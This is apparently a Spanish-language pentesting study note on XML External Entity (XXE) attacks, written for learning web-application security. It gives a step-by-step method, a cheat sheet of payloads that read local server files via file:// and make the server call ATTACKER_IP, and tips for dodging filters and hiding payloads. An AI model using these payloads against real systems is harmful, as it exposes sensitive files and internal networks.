---
tags:
  - XXE
  - webapp
  - attack
---
## Conceptos Clave (TL;DR)

* Las vulnerabilidades XXE ocurren cuando una aplicación toma datos XML controlados por el usuario y los procesa sin la debida sanitización o un parseo seguro.
* Un ataque exitoso permite abusar de las características del XML para causar un daño considerable, que va desde la divulgación de archivos sensibles hasta la interrupción del servidor backend (Denegación de Servicio).
* La técnica se basa en manipular el DTD (Document Type Definition) para declarar Entidades Externas (variables), las cuales instruyen al parser XML a cargar contenido desde una ruta o URL específica.

## Herramientas Clave

* El texto no menciona herramientas específicas de línea de comandos, pero indica que los vectores de entrada principales donde se explotan estas vulnerabilidades incluyen APIs SOAP (XML) y formularios web que procesan documentos en el servidor backend.

## Metodología Paso a Paso

* **Fase 1: Identificación del punto de entrada:** Localizar funciones en la aplicación web, como formularios o APIs SOAP, que acepten datos en formato XML.

* **Fase 2: Inyección de DTD:** Modificar la estructura del documento XML enviado al servidor para incluir una declaración `<!DOCTYPE>` que defina el esquema del documento.

* **Fase 3: Declaración de la Entidad Externa:** Utilizar la palabra clave `SYSTEM` (o `PUBLIC`) dentro del DTD para crear una entidad que apunte a un recurso externo o un archivo local en el servidor.

* **Fase 4: Invocación de la Entidad:** Referenciar la entidad creada (por ejemplo, `&signature;`) dentro de una etiqueta válida del cuerpo XML para que el parser la evalúe y reemplace por el contenido del archivo objetivo.

## Cheat Sheet de Comandos

```xml
# Payload base para definir e invocar una entidad interna simple
# Define la variable "company" y la invoca en el cuerpo

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE email [

  <!ENTITY company "<COMPANY_NAME>">

]>

<email>

    <body>&company;</body>

</email>
```

```xml
# Payload XXE para lectura de archivos locales en el servidor backend
# Utiliza SYSTEM con el wrapper file:// para extraer archivos sensibles

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE email [

  <!ENTITY signature SYSTEM "file://<TARGET_LOCAL_PATH>">

]>

<email>

    <body>&signature;</body>

</email>
```

```xml
# Payload XXE para interactuar con recursos de red remotos (SSRF)
# Utiliza SYSTEM con http:// para forzar al servidor a realizar una petición externa

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE email [

  <!ENTITY company SYSTEM "http://<ATTACKER_IP>/<TARGET_FILE>">

]>

<email>

    <body>&company;</body>

</email>
```

## "Gotchas" y Troubleshooting

* **Sintaxis de Entidades Externas:** La palabra clave `PUBLIC` puede utilizarse como alternativa a `SYSTEM` para cargar recursos externos en la gran mayoría de los casos si los filtros bloquean `SYSTEM`.

* **Caracteres Especiales:** Los caracteres `<`, `>`, `&`, y `"` son reservados estructuralmente en XML. Si se necesita interactuar con ellos sin romper el formato, deben ser reemplazados por sus referencias de entidad: `&lt;`, `&gt;`, `&amp;`, y `&quot;` respectivamente.

* **Comentarios Ocultos:** Se pueden utilizar comentarios en formato HTML (`<!-- texto -->`) dentro de los documentos XML, lo cual puede ser útil para ofuscar payloads o inhabilitar secciones del documento original.

````</TARGET_FILE></ATTACKER_IP></TARGET_LOCAL_PATH></COMPANY_NAME>